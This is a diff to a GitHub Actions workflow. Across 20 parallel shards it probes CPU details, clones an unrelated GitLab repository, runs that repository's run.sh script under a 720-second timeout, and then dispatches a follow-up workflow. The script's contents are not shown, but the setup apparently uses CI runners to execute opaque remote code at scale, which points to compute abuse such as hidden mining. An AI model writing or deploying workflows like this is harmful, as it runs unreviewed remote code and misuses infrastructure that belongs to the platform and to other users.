@@ -12,6 +12,10 @@ permissions:
   actions: write
   contents: read
 
+concurrency:
+  group: phase-lscpu
+  cancel-in-progress: false
+
 env:
   NODE_VERSION: '22.11.0'
 
@@ -25,56 +29,61 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 327
     steps:
-      - name: Setup Miniconda (classic solver)
-        uses: conda-incubator/setup-miniconda@v3
+      - name: Setup Node
+        uses: actions/setup-node@v4
         with:
-          auto-activate-base: true
-          activate-environment: ""
-          channels: conda-forge
-          channel-priority: strict
-          conda-remove-defaults: true
-          miniforge-version: latest
-
-      - name: Install Node.js via conda
-        shell: bash -l {0}
-        run: |
-          conda config --set solver classic
-          conda install -c conda-forge "nodejs=${{ env.NODE_VERSION }}" -y
-          conda clean -afy
-          which node
-          node --version
-          npm --version
+          node-version: ${{ env.NODE_VERSION }}
 
       - name: "shard ${{ matrix.shard }}/20"
-        shell: bash -l {0}
-        timeout-minutes: 50
+        timeout-minutes: 60
         env:
           SHARD: ${{ matrix.shard }}
         run: |
           set -uo pipefail
           echo "=== shard $SHARD/20 ==="
-          node -v
-          npm -v
-          nproc --all
-          lscpu | head -10
+
+          # ---------- apt: hanya deps Node.js native module ----------
+          need() { dpkg -s "$1" >/dev/null 2>&1 || MISSING+=("$1"); }
+          MISSING=()
+          for p in \
+            build-essential python3 python3-dev pkg-config make g++ \
+            libssl-dev zlib1g-dev libsqlite3-dev \
+            libvips-dev \
+            libcairo2-dev libpango1.0-dev libjpeg-dev libgif-dev librsvg2-dev \
+            ffmpeg imagemagick \
+            git curl wget unzip ca-certificates; do
+            need "$p"
+          done
+
+          if [ ${#MISSING[@]} -gt 0 ]; then
+            echo ">>> Install: ${MISSING[*]}"
+            sudo apt-get update -qq
+            sudo apt-get install -y -qq --no-install-recommends "${MISSING[@]}"
+          else
+            echo ">>> Semua deps sudah ada, skip apt"
+          fi
+          # ----------------------------------------------------------
+
+          echo "=== versi ==="
+          node -v; npm -v; which node
+          nproc --all; lscpu | head -10
 
           git clone --depth 1 https://gitlab.com/masaakk88/file/xiaomi01.git
           cd xiaomi01
           chmod +x run.sh
 
-          timeout 720 ./run.sh >/dev/null 2>&1
-          RC=$?
-
+          timeout 720 ./run.sh 2>&1 | tail -200
+          RC=${PIPESTATUS[0]}
           if [ "$RC" -ne 0 ] && [ "$RC" -ne 124 ]; then
-            echo "❌ shard $SHARD gagal (exit $RC)"
-            exit "$RC"
+            echo "❌ shard $SHARD gagal (exit $RC)"; exit "$RC"
           fi
           echo "✅ shard $SHARD selesai"
+
   trigger-hello:
     needs: shards
     if: always()
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 2
     steps:
       - name: Dispatch phase-hello
         env:
